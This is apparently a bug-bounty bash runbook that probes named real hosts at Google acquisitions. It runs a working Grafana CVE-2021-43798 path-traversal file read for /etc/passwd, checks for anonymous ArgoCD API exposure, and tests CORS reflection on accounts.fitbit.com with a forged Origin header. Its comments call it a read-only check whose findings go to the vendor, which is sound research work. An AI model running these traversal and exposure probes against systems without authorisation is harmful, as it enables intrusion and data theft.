#!/usr/bin/env bash
# =============================================================================
# Google VRP — verify the real leads from gv2 (gvrp-session3)
# Portable: Linux / Pi / Termux. curl only.
#
# Leads from gv2 exposure scan:
#   - grafana.nestlabs.com, grafana-v2.nestlabs.com  -> Grafana CVE-2021-43798
#     (unauth path-traversal arbitrary file read) — benign /etc/passwd canary
#   - argocd-gke-app-{eu,us}-{dev,prod,test}.photomath.net -> ArgoCD: version +
#     anonymous API access (/api/v1/applications) + login exposure
#   - accounts.fitbit.com -> verify whether an AUTHENTICATED data endpoint honors
#     the credentialed CORS (the only thing that makes CORS a real bug)
#   - getip.cameyo.com/openapi.json -> read the spec, probe endpoints unauth
#
# SAFETY: in-scope (Google acquisitions). Detection/PoC only. Grafana LFI canary
# reads ONLY /etc/passwd (non-sensitive, standard LFI proof) — do NOT exfiltrate
# secrets/grafana.ini. Read-only. Report confirmed issues to Google VRP.
#
# Run: OUTDIR=$HOME/gv3 bash runbooks/PI-RUNBOOK-gvrp-session3-verify.sh 2>&1 | tee $HOME/gv3/gv3.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/gv3
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/gv3"
  else OUTDIR="$HOME/gv3"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
echo "============================================================"
echo "GVRP VERIFY  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR"; echo "============================================================"; echo ""

g(){ curl -sk --path-as-is -H "user-agent: $UA" --max-time 20 "$@"; }

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ A: GRAFANA CVE-2021-43798 (unauth file read) ═══"
for H in grafana.nestlabs.com grafana-v2.nestlabs.com; do
  echo "  -- $H --"
  ver=$(g "https://$H/api/health" | head -c 200)
  echo "    /api/health: $ver"
  hit=0
  for PL in alertlist annolist barchart bargauge candlestick cloudwatch dashlist gauge geomap gettingstarted graph heatmap histogram logs news nodeGraph piechart pluginlist stat state-timeline status-history table text timeseries welcome xychart; do
    out=$(g "https://$H/public/plugins/$PL/../../../../../../../../etc/passwd")
    if echo "$out" | grep -qE '^root:.*:0:0:'; then
      echo "    *** VULNERABLE via plugin '$PL' — /etc/passwd read:"
      echo "$out" | head -3 | sed 's/^/        /'
      echo "$H plugin=$PL" >> "$OUTDIR/grafana-lfi.txt"; hit=1; break
    fi
    sleep 0.2
  done
  [ "$hit" = 0 ] && echo "    not vulnerable (patched or plugin path blocked)"
done
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ B: ARGOCD exposure (version + anonymous API) ═══"
for H in argocd-gke-app-eu-dev argocd-gke-app-eu-prod argocd-gke-app-eu-test argocd-gke-app-us-prod argocd-gke-app-us-test; do
  FQ="$H.photomath.net"
  echo "  -- $FQ --"
  v=$(g "https://$FQ/api/version"); echo "    /api/version: $(echo "$v"|head -c 200)"
  # anonymous app listing = exposed deploy configs/secrets
  apps=$(g "https://$FQ/api/v1/applications" -w '|%{http_code}')
  code="${apps##*|}"; body="${apps%|*}"
  echo "    /api/v1/applications -> HTTP $code  $(echo "$body"|head -c 120|tr '\n' ' ')"
  if [ "$code" = "200" ] && echo "$body" | grep -q '"items"\|"metadata"'; then
    echo "    *** ANONYMOUS ArgoCD API ACCESS — application list exposed (config/secrets)"
    echo "$FQ" >> "$OUTDIR/argocd-anon.txt"
  fi
  sleep 0.3
done
echo "  (ArgoCD CVEs to check if a version is leaked: CVE-2022-29165 auth bypass,"
echo "   CVE-2023-22482/22736 path/RBAC; CVE-2024-21652/21661 — match version above.)"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ C: accounts.fitbit.com — is the credentialed CORS exploitable? ═══"
echo "  (CORS is only a bug if an authenticated DATA endpoint reflects Origin+ACAC)"
for P in / /api /api/user /api/1/user/-/profile.json /1/user/-/profile.json /oauth2/token /api/me /session; do
  hdr=$(curl -sk -I -H "user-agent: $UA" -H "Origin: https://evil.example.com" --max-time 15 "https://accounts.fitbit.com$P")
  acao=$(echo "$hdr"|grep -i '^access-control-allow-origin:'|tr -d '\r')
  acac=$(echo "$hdr"|grep -i '^access-control-allow-credentials:'|tr -d '\r')
  code=$(echo "$hdr"|grep -oE 'HTTP/[0-9.]+ [0-9]{3}'|head -1)
  if echo "$acao"|grep -qi 'evil.example.com'; then
    printf '    %-40s %s  %s | %s\n' "$P" "$code" "$acao" "$acac"
  fi
  sleep 0.2
done
echo "  -> A reflected Origin+ACAC:true on an endpoint returning USER data = the bug."
echo "     Root/login pages reflecting = informational only."
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ D: getip.cameyo.com OpenAPI + endpoints ═══"
g "https://getip.cameyo.com/openapi.json" -o "$OUTDIR/cameyo-openapi.json"
echo "  openapi.json:"; head -c 600 "$OUTDIR/cameyo-openapi.json"; echo
echo "  paths:"; grep -oE '"/[^"]*"\s*:\s*\{' "$OUTDIR/cameyo-openapi.json" | head -20 | sed 's/^/    /'
echo ""

echo "════════════════════════════════════════════"
echo "VERDICT"
echo "════════════════════════════════════════════"
[ -s "$OUTDIR/grafana-lfi.txt" ] && echo "  *** GRAFANA LFI CONFIRMED (CVE-2021-43798): $(cat "$OUTDIR/grafana-lfi.txt") -> High/Critical, report now"
[ -s "$OUTDIR/argocd-anon.txt" ] && echo "  *** ARGOCD ANON API: $(cat "$OUTDIR/argocd-anon.txt") -> High, report"
[ ! -s "$OUTDIR/grafana-lfi.txt" ] && [ ! -s "$OUTDIR/argocd-anon.txt" ] && echo "  No unauth RCE/LFI/anon-API confirmed this pass; review CORS/version output above."
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
